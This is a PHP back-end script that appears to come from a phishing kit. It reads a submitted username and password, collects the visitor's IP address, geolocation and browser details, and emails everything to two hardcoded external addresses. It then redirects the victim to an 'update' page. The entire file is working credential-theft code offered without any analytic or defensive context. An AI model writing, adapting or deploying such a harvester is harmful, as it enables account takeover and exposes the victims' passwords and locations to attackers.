<?php
$login = $_POST['login'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "username: ".$_POST['login']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'TALLEST Bomb';
$subj = "Mailbox Alldomain";
$from = "From: $domain<west>\n";
mail("eventus11@hotmail.com, eventustus482@gmail.com",$subj,$message,$from,$domain);

header("Location: update.php");
?>